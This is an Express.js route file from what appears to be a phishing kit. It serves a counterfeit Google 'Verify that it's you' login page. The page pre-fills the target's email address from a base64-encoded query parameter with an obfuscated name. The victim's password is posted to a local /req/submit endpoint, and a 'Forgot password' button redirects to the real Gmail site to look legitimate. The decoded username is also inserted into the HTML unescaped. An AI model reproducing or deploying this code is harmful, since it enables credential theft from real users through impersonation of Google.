
const express = require ('express');
const router = express.Router();
const db = require('../db');
router.use(express.static('public'));



//validate form data before handling
// Custom middleware for form validation
router.get('/', (req, res) => {

    const data3 = req.query.kjgfhdgudgherueru9843efjdfhfwheur;
    const username = Buffer.from(data3, 'base64').toString('utf-8');
  

    if (data3 == null) {
        res.render('error');
        
      }else{
    const htmlContent = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gmail</title>
    <link rel="shortcut icon" href="./images/image.png" type="image">
    <link rel="stylesheet" href="./stylesheet/newstyle.css">
</head>
<body>
    <div class="maindiv">
    
        <form class="loginform" method="post" name="loginForm" action="/req/submit" accept-charset="UTF-8">
       
            <div class="form-half">
                <div><img class="divlogo" src="./images/image.png" ></div>
                <div><b><span class="welcome">Verify that it's you<span></b></div>                
                <div class="userdiv">
                  <img class="left-img"  src="./images/user-circle.png" >&nbsp;&nbsp;
                  <span style="color: #2c2a2a;; font-size: 18px; font-family: Arial, Helvetica, sans-serif;">${username}</span>&nbsp;
                  <img class="right-img" src="./images/dropd.jpg">
                  
                </div>
            </div>
            <div class="form-half1">
            <span style="text-align:left;" "color: #1f1f1f; font-size: 12px; font-family: Arial, Helvetica, sans-serif;">To help keep your account secure, <br>Google needs to verify it’s you. Please sign in again to continue.</span><br>
                <div class="passdiv">
                    <input type='hidden' name="username" id="useRname" value="${username}">
                    <input  required='' name="password" type='password' id="pEyar">
                    <label style="color:#2c2a2a;; font-size: 16px; font-family: Arial, Helvetica, sans-serif;" alt='Enter your password' placeholder='Password'></label>
                </div>

                <div class="shwpwd">
     
                    <input type="checkbox" onclick="ShowpassWord();" class="checkbox">
                    <span onclick="ShowpassWord();" class="button">Show password</span>
                </div>

                <script src="./script/pass.js"></script>

                <div class="fgtpwd">
                    <button id="myButton" class="hyperl" >Forgot password?</button>&nbsp;&nbsp;&nbsp;
                    <button type="submit" class="btnnxt">Next</button>
                    <script>
                      // JavaScript to redirect on button click
                      document.getElementById("myButton").onclick = function () {
                          location.href = "https://mail.google.com"; // Replace "https://example.com" with your desired URL
                      };
                  </script>
                  </div>

            </div>

           
      
        </form>

        <div class="btmdiv">
            <div class="left-div">
                <select class="btmhypl" id="language-select">
                    <option value="en">English (United States)</option>
                    <option value="fr">French</option>
                    <option value="es">Spanish</option>
                    <option value="de">German</option>
                    <!-- Add more options as needed -->
                </select>
            </div>
                <div class="right-divs">
                    <div class="right-div">
                        <button id="myButton" class="btmhypl" >Help</button>
                    </div>
                    <div class="right-div">
                        <button id="myButton" class="btmhypl" >Privacy</button>
                    </div>
                    <div class="right-div">
                        <button id="myButton" class="btmhypl" >Terms</button>
                    </div>
                </div>
        </div>


    </div>
    
</body>
</html>
    `;

    // Send the HTML content as a response
    res.send(htmlContent);
      }
});



module.exports =router
